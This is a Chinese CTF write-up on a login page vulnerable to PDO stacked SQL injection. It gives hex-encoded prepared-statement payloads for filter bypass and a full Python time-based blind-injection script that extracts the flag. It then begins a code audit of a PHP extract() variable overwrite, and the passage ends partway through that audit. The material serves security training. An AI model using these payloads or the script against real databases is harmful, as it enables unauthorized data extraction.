sql注入判定

给的是个登录界面，并且没有开放注册功能，登录键点了也没反应，抓包

这种登录界面的一般就是sql注入了

当username字段的值为1'或1;'时报错了，而当username为1''或者1';时，报错又消失了，wp上说这种是PDO模式下的堆叠注入，emmm，堆叠注入也做过一两题。

php中的PDO

那什么是PDO呢？

https://xz.aliyun.com/t/3950

https://www.runoob.com/php/php-pdo.html

这里默认是pdo对象的query语句是能执行有;参与的多语句执行的，那我们就能闭合前面的单引号后进行堆叠注入。

sql过滤关键词的绕过——运用sql的预处理语句绕

emmm，看wp的话应该是过滤了一些关键字的，这里没有任何特殊回显的情况下呢，一般就是盲注，盲注中呢，这种情况用时间盲注的概率又较大。

时间盲注的大致思路

select if(ascii(substr((select flag from flag),{0},1))={1},sleep(5),1)，其中呢{0}一般是猜测该字段可能的长度（毕竟要用substr截取），而{1}一般就是32-128的ascii的数值（盲注爆破）。

sql预处理绕过过滤

接下来实验如何绕过这些单词的限制，用的是十六进制表示与sql预处理的结合。

这里看wp测试的大概就是这几步吧

mysql> select hex('select sleep(5)');
mysql> set @a=0x73656C65637420736C656570283529;
mysql> prepare test from @a;
mysql> execute test;

select sleep(5);语句可以让mysql服务休息5秒。这里这四句相当于执行了该语句，从而绕过上传被过滤的字符串。

实验过后确实可以，截图如下

# author: c1e4r
import requests
import json
import time
import string


def main():
    s = string.printable
    # 题目地址
    url = 'http://0d9cf3a3-f742-48ea-9ba6-e7c35f61652b.node3.buuoj.cn/index.php?r=Login/Login'
    # 注入payload
    payloads = "asd';set @a=0x{0};prepare exc from @a;execute exc-- "
    flag = ''
    for i in range(1, 31):
        # 查询payload
        payload = "select if(ascii(substr((select flag from flag),{0},1))={1},sleep(1),1)"
        for j in s:
            # 将构造好的payload进行16进制转码和json转码
            datas = {'username': payloads.format(str_to_hex(payload.format(i, ord(j)))), 'password': 'test213'}
            data = json.dumps(datas)
            times = time.time()
            res = requests.post(url=url, data=data)
            if time.time() - times >= 1:
                flag = flag + j
                print(flag)
                break


def str_to_hex(s):
    return ''.join([hex(ord(c)).replace('0x', '') for c in s])


if __name__ == '__main__':
    main()

代码审计，变量覆盖

注意到所有的前端应用到的逻辑的基础都是在controller文件夹下，而其他两个文件又都是基于basecontroller.php文件的，一切从这个文件展开

public function loadView($viewName ='', $viewData = [])
	{
		$this->viewPath = BASE_PATH . "/View/{$viewName}.php";
		if(file_exists($this->viewPath))
		{
			extract($viewData);
			include $this->viewPath;
		}
	}

emmm，这里用了extract函数，传入viewdata数组造成变量覆盖，利用loadView方法的并且第二个元素可控的地方只有UserController.php文件这一个地方

public function actionIndex()
    {
        $listData = $_REQUEST;
        $this->loadView('userIndex',$listData);
    }

这里的$listData = $_REQUEST;可以控制，故再转到userIndex.php文件看看，
